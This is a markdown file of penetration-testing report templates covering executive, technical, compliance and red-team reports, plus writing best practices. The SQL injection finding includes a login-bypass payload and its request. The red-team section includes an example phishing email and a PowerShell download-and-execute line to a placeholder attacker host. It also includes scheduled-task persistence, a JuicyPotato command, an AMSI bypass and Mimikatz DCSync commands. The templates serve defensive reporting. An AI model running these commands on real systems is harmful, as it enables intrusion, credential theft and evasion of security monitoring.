# Penetration Testing Report Templates

> **⚠️ IMPORTANT**: This file is being superseded by the comprehensive [PROFESSIONAL_REPORT_STANDARD.md](./PROFESSIONAL_REPORT_STANDARD.md) which follows industry standards (PTES, OWASP OPTRS, SANS).
>
> **For new penetration testing reports**, use the professional standard which includes:
> - Complete executive report template (1-2 pages for C-level)
> - Comprehensive technical report template (for security teams)
> - CVSS v3.1 scoring, OWASP Top 10, CWE, and MITRE ATT&CK mappings
> - PoC verification requirements and quality checklists
> - JSON output format for automation
>
> This file remains for reference and backward compatibility.

## Overview
This document provides standardized templates and guidelines for creating professional penetration testing reports.

---

## Executive Summary Template

### Purpose
High-level overview for non-technical stakeholders and management.

### Template Structure

```markdown
# PENETRATION TEST EXECUTIVE SUMMARY

## Engagement Overview

**Client:** [Company Name]
**Test Dates:** [Start Date] - [End Date]
**Assessor:** [Your Name/Company]
**Report Date:** [Date]

## Objective

The objective of this penetration test was to identify security vulnerabilities
in [Target System/Application] and assess the overall security posture of
[Organization Name].

## Scope

The following systems and applications were included in this assessment:
- [System/Application 1]
- [System/Application 2]
- [IP Ranges/Domains]

**Out of Scope:**
- [Excluded systems]
- [Excluded attack types (e.g., DoS)]

## Methodology

This assessment followed industry-standard methodologies including:
- OWASP Testing Guide
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115

Testing phases included:
1. Reconnaissance and Intelligence Gathering
2. Vulnerability Assessment
3. Exploitation
4. Post-Exploitation
5. Reporting

## High-Level Findings

### Overall Risk Rating: [CRITICAL/HIGH/MEDIUM/LOW]

A total of [X] vulnerabilities were identified:
- **Critical:** [X] findings
- **High:** [X] findings
- **Medium:** [X] findings
- **Low:** [X] findings
- **Informational:** [X] findings

### Key Findings

1. **[Finding Title 1]** - Critical
   - **Impact:** Unauthorized access to production database
   - **Recommendation:** Implement input validation and parameterized queries

2. **[Finding Title 2]** - High
   - **Impact:** Remote code execution on web servers
   - **Recommendation:** Update to latest software version and apply patches

3. **[Finding Title 3]** - High
   - **Impact:** Privilege escalation to domain administrator
   - **Recommendation:** Review and restrict service account permissions

## Risk Heat Map

| Severity | Count | Percentage |
|----------|-------|------------|
| Critical | [X]   | [X]%       |
| High     | [X]   | [X]%       |
| Medium   | [X]   | [X]%       |
| Low      | [X]   | [X]%       |
| Info     | [X]   | [X]%       |

## Business Impact

The identified vulnerabilities could result in:
- **Data Breach:** Exposure of [X] customer records
- **Financial Loss:** Estimated $[X] from potential ransomware attack
- **Compliance:** Violations of [PCI-DSS/HIPAA/GDPR]
- **Reputation:** Damage to brand reputation and customer trust

## Strategic Recommendations

1. **Immediate Actions (0-30 days):**
   - Patch critical vulnerabilities
   - Disable unused services
   - Reset compromised credentials

2. **Short-term Actions (1-3 months):**
   - Implement security monitoring
   - Deploy web application firewall
   - Conduct security awareness training

3. **Long-term Actions (3-12 months):**
   - Implement DevSecOps practices
   - Regular penetration testing
   - Security architecture review

## Conclusion

[Summary paragraph about overall security posture and recommended next steps]

## Appendices

- Appendix A: Detailed Technical Findings
- Appendix B: Remediation Timeline
- Appendix C: Testing Methodology Details
```

---

## Technical Findings Report Template

### Purpose
Detailed technical documentation for IT and security teams.

### Template Structure

```markdown
# PENETRATION TEST TECHNICAL REPORT

## Report Information

**Client:** [Company Name]
**Test Type:** [External/Internal/Web Application/Network]
**Test Dates:** [Start Date] - [End Date]
**Assessor:** [Name/Team]
**Report Version:** [1.0]
**Classification:** [CONFIDENTIAL]

## Table of Contents

1. Executive Summary
2. Scope and Methodology
3. Technical Findings
4. Risk Rating Matrix
5. Recommendations
6. Appendices

## 1. Executive Summary

[Reference executive summary template above]

## 2. Scope and Methodology

### 2.1 Scope Definition

**In Scope:**
- IP Ranges: [X.X.X.X/24]
- Domains: [domain1.com, domain2.com]
- Applications: [App1, App2]
- Time Period: [Business hours/24x7]

**Out of Scope:**
- Third-party hosted services
- Denial of Service attacks
- Social engineering (unless specified)

### 2.2 Methodology

This penetration test followed the PTES methodology:

**Phase 1: Reconnaissance**
- OSINT gathering
- DNS enumeration
- Service discovery

**Phase 2: Scanning & Enumeration**
- Port scanning (Nmap)
- Service version detection
- Vulnerability scanning

**Phase 3: Exploitation**
- Vulnerability verification
- Exploit testing
- Access demonstration

**Phase 4: Post-Exploitation**
- Privilege escalation
- Lateral movement
- Data access testing

**Phase 5: Reporting**
- Documentation
- Evidence collection
- Recommendations

### 2.3 Tools Used

- Nmap - Network scanning
- Burp Suite - Web application testing
- Metasploit - Exploitation framework
- SQLmap - SQL injection testing
- Hashcat - Password cracking
- [Additional tools]

## 3. Technical Findings

---

### Finding #1: SQL Injection in Login Form

**Severity:** CRITICAL (CVSS: 9.8)

**Affected System:**
- URL: https://app.example.com/login
- Parameter: username
- Component: Authentication module

**Description:**

The login form at /login is vulnerable to SQL injection attacks. By injecting
malicious SQL syntax into the username parameter, an attacker can bypass
authentication and gain unauthorized access to the application.

**Technical Details:**

The application concatenates user input directly into SQL queries without
proper sanitization:

```sql
SELECT * FROM users WHERE username='[USER_INPUT]' AND password='[PASSWORD]'
```

**Proof of Concept:**

1. Navigate to https://app.example.com/login
2. Enter the following payload in the username field:
   ```
   admin' OR '1'='1'--
   ```
3. Enter any value in the password field
4. Click "Login"
5. Application grants access as admin user

**Evidence:**

![SQL Injection - Login Bypass](screenshots/finding1-sqli.png)

**Request:**
```http
POST /login HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

username=admin'+OR+'1'='1'--&password=test
```

**Response:**
```http
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ...
```

**Impact:**

- **Confidentiality:** HIGH - Access to all user data
- **Integrity:** HIGH - Ability to modify database records
- **Availability:** MEDIUM - Potential for database corruption

**Business Impact:**
- Complete compromise of user accounts
- Unauthorized access to sensitive customer data
- Potential regulatory violations (PCI-DSS, GDPR)
- Reputational damage

**Affected Users:**
All application users (approximately 10,000 accounts)

**Remediation:**

**Priority:** IMMEDIATE (Fix within 24-48 hours)

1. **Implement Parameterized Queries:**
   ```python
   # Before (Vulnerable)
   query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

   # After (Secure)
   query = "SELECT * FROM users WHERE username=? AND password=?"
   cursor.execute(query, (username, password_hash))
   ```

2. **Input Validation:**
   - Implement whitelist validation for username format
   - Sanitize all user inputs
   - Use ORM frameworks with built-in protection

3. **Additional Security Measures:**
   - Implement Web Application Firewall (WAF)
   - Enable SQL error suppression
   - Implement rate limiting
   - Add logging for injection attempts

**Verification Steps:**

1. Apply parameterized queries fix
2. Test with previous PoC payload - should be rejected
3. Verify legitimate logins still work
4. Review application logs for errors
5. Conduct regression testing

**References:**
- OWASP: A03:2021 - Injection
- CWE-89: SQL Injection
- CAPEC-66: SQL Injection
- CVE Examples: CVE-2021-XXXXX

**CVSS v3.1 Score:** 9.8 (Critical)
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

---

### Finding #2: [Next Finding]

[Repeat format for each finding]

---

## 4. Risk Rating Matrix

### CVSS v3.1 Scoring System

| Rating | CVSS Score | Description |
|--------|------------|-------------|
| Critical | 9.0-10.0 | Immediate threat requiring urgent action |
| High | 7.0-8.9 | Significant risk requiring prompt attention |
| Medium | 4.0-6.9 | Moderate risk, should be addressed soon |
| Low | 0.1-3.9 | Minor risk, low priority |
| Info | 0.0 | No direct security impact |

### Findings Summary

| ID | Title | Severity | CVSS | Status |
|----|-------|----------|------|--------|
| 1 | SQL Injection in Login | Critical | 9.8 | Open |
| 2 | XSS in Comment Field | High | 7.3 | Open |
| 3 | Missing Access Controls | High | 8.1 | Open |
| 4 | Weak Password Policy | Medium | 5.3 | Open |
| 5 | Information Disclosure | Low | 3.1 | Open |

## 5. Recommendations

### 5.1 Immediate Actions (0-30 days)

**Priority 1 - Critical:**
1. Fix SQL injection vulnerabilities (Finding #1)
2. Patch remote code execution flaws
3. Reset compromised credentials
4. Disable unused services

**Priority 2 - High:**
1. Fix XSS vulnerabilities
2. Implement proper access controls
3. Update vulnerable software components
4. Enable security logging

### 5.2 Short-term Actions (1-3 months)

1. Implement Web Application Firewall
2. Deploy intrusion detection system
3. Conduct security awareness training
4. Implement password policy improvements
5. Enable multi-factor authentication

### 5.3 Long-term Actions (3-12 months)

1. Security architecture review
2. Implement DevSecOps practices
3. Regular penetration testing (quarterly)
4. Security code review process
5. Incident response plan development

### 5.4 Best Practices

**Secure Development:**
- Follow OWASP Secure Coding Practices
- Implement security code reviews
- Use static and dynamic analysis tools
- Security training for developers

**Network Security:**
- Network segmentation
- Least privilege access
- Regular patching
- Security monitoring

**Application Security:**
- Input validation
- Output encoding
- Secure authentication
- Session management

## 6. Appendices

### Appendix A: Testing Timeline

| Date | Activity | Duration |
|------|----------|----------|
| 2024-01-15 | Reconnaissance | 4 hours |
| 2024-01-16 | Vulnerability Scanning | 6 hours |
| 2024-01-17-18 | Exploitation | 16 hours |
| 2024-01-19 | Post-Exploitation | 8 hours |
| 2024-01-20-22 | Report Writing | 16 hours |

### Appendix B: Vulnerability Details

[Extended technical details, additional PoCs, raw tool output]

### Appendix C: Tools and Commands

**Network Scanning:**
```bash
nmap -sS -sV -sC -oA scan_results target.com
```

**Web Application Testing:**
```bash
nikto -h https://target.com
sqlmap -u "https://target.com/page?id=1" --batch --dbs
```

### Appendix D: Compliance Mapping

| Finding | PCI-DSS | HIPAA | GDPR | ISO 27001 |
|---------|---------|-------|------|-----------|
| SQL Injection | 6.5.1 | §164.308 | Art. 32 | A.14.2 |
| XSS | 6.5.7 | §164.308 | Art. 32 | A.14.2 |

### Appendix E: Glossary

**SQL Injection:** A code injection technique used to attack data-driven applications...

**XSS:** Cross-site scripting, a vulnerability that allows attackers to inject scripts...

[Additional terms]
```

---

## Compliance-Focused Report Template

### Purpose
Mapping findings to compliance frameworks (PCI-DSS, HIPAA, GDPR, etc.)

### Template Structure

```markdown
# COMPLIANCE-FOCUSED PENETRATION TEST REPORT

## Framework: [PCI-DSS v4.0 / HIPAA / GDPR / ISO 27001]

## Requirement Testing Results

### PCI-DSS Requirement 6: Develop and Maintain Secure Systems

**Requirement 6.2: Protect systems from known vulnerabilities**

**Status:** ❌ NON-COMPLIANT

**Findings:**
- Finding #1: Unpatched web server (Apache 2.4.41 - CVE-2019-XXXX)
- Finding #2: Outdated CMS version with known vulnerabilities

**Evidence:**
[Screenshots, scan results]

**Impact on Compliance:**
Failure to patch known vulnerabilities violates PCI-DSS 6.2.1

**Remediation:**
- Implement patch management process
- Update all software to latest secure versions
- Regular vulnerability scanning

**Target Completion:** [Date]

---

### PCI-DSS Requirement 6.5: Address common coding vulnerabilities

**Requirement 6.5.1: Injection flaws**

**Status:** ❌ NON-COMPLIANT

**Findings:**
- Finding #3: SQL Injection in payment processing form
- Finding #4: Command injection in admin panel

**Evidence:**
[Technical details]

**Impact on Compliance:**
SQL injection vulnerability directly violates PCI-DSS 6.5.1

**Remediation:**
- Implement parameterized queries
- Input validation
- Code review process

---

## Compliance Summary

| Requirement | Status | Findings | Priority |
|-------------|--------|----------|----------|
| 6.2 | Non-Compliant | 2 | High |
| 6.5.1 | Non-Compliant | 2 | Critical |
| 6.5.7 | Non-Compliant | 3 | High |
| 11.3 | Compliant | 0 | - |

## Compliance Gap Analysis

**Critical Gaps:**
1. SQL Injection vulnerabilities (6.5.1)
2. Missing WAF (6.6)
3. Inadequate logging (10.2)

**Remediation Timeline:**
- Critical: 30 days
- High: 60 days
- Medium: 90 days
```

---

## Red Team Report Template

### Purpose
Documenting adversary simulation and attack path scenarios.

### Template Structure

```markdown
# RED TEAM ENGAGEMENT REPORT

## Engagement Overview

**Type:** Assumed Breach / External Attack / Physical + Digital
**Duration:** [X] weeks
**Objective:** Compromise Domain Admin / Exfiltrate Data / Achieve Persistence

## Attack Narrative

### Initial Access

**Date:** 2024-01-15
**Method:** Spear-phishing email to IT department
**Target:** helpdesk@company.com

We crafted a phishing email impersonating the company's software vendor:

**Email Content:**
```
Subject: Critical Security Update Required
From: support@s0ftware-vendor.com [spoofed]

Dear IT Team,

A critical security vulnerability has been discovered...
Please download and install the patch immediately:
[malicious link]
```

**Result:** 3 clicks, 1 macro execution, initial foothold established

---

### Execution

**Payload:** Custom PowerShell dropper
**C2 Framework:** Cobalt Strike
**Beacon:** HTTPS over port 443 to cloudfront[.]net

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/payload.ps1')
```

**Result:** Command and control established, persistence via scheduled task

---

### Persistence

**Method:** Scheduled task with SYSTEM privileges

```powershell
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -w hidden -c IEX(...)" /sc onlogon /ru SYSTEM
```

**Result:** Maintained access even after user logoff

---

### Privilege Escalation

**Method:** Token impersonation (SeImpersonate privilege)

Using JuicyPotato exploit:
```powershell
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

**Result:** Elevated to SYSTEM on workstation

---

### Defense Evasion

**Techniques Used:**
- Process injection into legitimate processes
- AMSI bypass
- Living off the land (PowerShell, WMI)
- Encrypted C2 communication

**EDR Evasion:**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Result:** Evaded EDR detection for [X] days

---

### Credential Access

**Method:** Mimikatz + DCSync

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:Administrator
```

**Credentials Obtained:**
- 15 local admin accounts
- 3 domain admin accounts
- 50+ user accounts

---

### Discovery

**Active Directory Enumeration:**
```powershell
Import-Module PowerView
Get-DomainUser -AdminCount
Get-DomainComputer
Find-LocalAdminAccess
```

**Findings:**
- Domain structure mapped
- 150 workstations identified
- 25 servers cataloged
- Admin relationships documented

---

### Lateral Movement

**Path to Domain Admin:**

1. Compromised workstation (User A)
2. Found cached credentials for Server Admin
3. Moved to File Server
4. Dumped LSASS, found Domain Admin session
5. Extracted Domain Admin token
6. Accessed Domain Controller

**Timeline:** 3 days from initial access to domain admin

---

### Collection & Exfiltration

**Data Collected:**
- Customer database (500,000 records)
- Financial documents
- Employee PII
- Intellectual property

**Exfiltration Method:**
- DNS tunneling (dnscat2)
- HTTPS to cloud storage
- Encrypted with AES-256

**Volume:** 50 GB over 2 weeks

**Detection:** None - exfiltration not detected

---

## Attack Chain Diagram

```
[Phishing Email]
    ↓
[User Clicks Link]
    ↓
[Payload Execution]
    ↓
[C2 Beacon]
    ↓
[Privilege Escalation]
    ↓
[Credential Dumping]
    ↓
[Lateral Movement]
    ↓
[Domain Admin]
    ↓
[Data Exfiltration]
```

## Detection Opportunities Missed

1. **Initial Access:**
   - Email gateway did not flag spoofed domain
   - User clicked malicious link without warning

2. **Execution:**
   - PowerShell execution policy not enforced
   - Script execution not logged

3. **Persistence:**
   - Scheduled task creation not monitored
   - SYSTEM-level tasks not restricted

4. **Lateral Movement:**
   - No detection of pass-the-hash
   - Abnormal authentication patterns ignored

5. **Exfiltration:**
   - DNS tunneling not detected
   - Large data transfers not flagged

## Blue Team Recommendations

### Detection Improvements

1. **Email Security:**
   - Implement DMARC
   - External email banners
   - Link sandboxing

2. **Endpoint Detection:**
   - Enable PowerShell logging
   - Deploy EDR with behavioral detection
   - Implement application whitelisting

3. **Network Monitoring:**
   - DNS query analysis
   - Data loss prevention
   - Network segmentation

4. **Active Directory:**
   - Implement tiered administration
   - Monitor DCSync attempts
   - Deploy honeypot accounts

### Response Improvements

1. Create incident response playbook
2. Practice detection scenarios
3. Improve alert tuning
4. Reduce mean time to detect (MTTD)

## Lessons Learned

**What Worked:**
- Social engineering was effective
- Living off the land avoided detection
- C2 infrastructure remained undetected

**What Didn't Work:**
- Initial phishing had low click rate
- Some lateral movement attempts logged

**Recommendations:**
- Focus on detection engineering
- Implement defense in depth
- Regular purple team exercises
```

---

## Finding Template (Standalone)

```markdown
### Finding: [Vulnerability Title]

**ID:** [F-001]
**Severity:** [CRITICAL/HIGH/MEDIUM/LOW/INFO]
**CVSS Score:** [X.X]
**Status:** [Open/In Progress/Fixed/Accepted Risk]

#### Affected System
- **Host:** [hostname/IP]
- **URL/Service:** [specific location]
- **Component:** [affected component]

#### Description
[Detailed vulnerability description]

#### Technical Details
[Technical explanation of the vulnerability]

#### Proof of Concept
```
[Step-by-step reproduction steps]
```

#### Evidence
![Screenshot](path/to/screenshot.png)

#### Impact
- **Confidentiality:** [HIGH/MEDIUM/LOW]
- **Integrity:** [HIGH/MEDIUM/LOW]
- **Availability:** [HIGH/MEDIUM/LOW]

[Detailed impact description]

#### Likelihood
[HIGH/MEDIUM/LOW] - [Justification]

#### Risk Rating
Severity: [X] × Likelihood: [X] = Risk: [X]

#### Remediation
**Short-term:**
- [Immediate fix]

**Long-term:**
- [Comprehensive solution]

#### References
- [OWASP/CWE/CVE references]
- [Documentation links]

#### CVSS Vector
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```
```

---

## Best Practices for Report Writing

### 1. Executive Summary
- Write for non-technical audience
- Use business language
- Focus on risk and impact
- Include visual aids (charts, graphs)
- Keep it brief (2-3 pages max)

### 2. Technical Details
- Be precise and reproducible
- Include all necessary evidence
- Provide clear proof of concepts
- Document every step
- Include tool output when relevant

### 3. Screenshots and Evidence
- Highlight important information
- Add captions and descriptions
- Redact sensitive data when necessary
- Use arrows and annotations
- Professional appearance

### 4. Remediation Guidance
- Provide specific solutions
- Include code examples
- Prioritize by risk
- Realistic timelines
- Verification steps

### 5. Report Quality
- Professional formatting
- Consistent terminology
- Proofread thoroughly
- Logical organization
- Clear language

### 6. Compliance Considerations
- Map to relevant frameworks
- Include requirement numbers
- Explain compliance impact
- Provide audit trail
- Reference standards

---

## Report Delivery Checklist

- [ ] Executive summary completed
- [ ] All findings documented
- [ ] Screenshots and evidence included
- [ ] CVSS scores calculated
- [ ] Remediation steps provided
- [ ] References cited
- [ ] Proofread and edited
- [ ] Sensitive data redacted
- [ ] Client-specific customization
- [ ] PDF generated
- [ ] Secure delivery method arranged
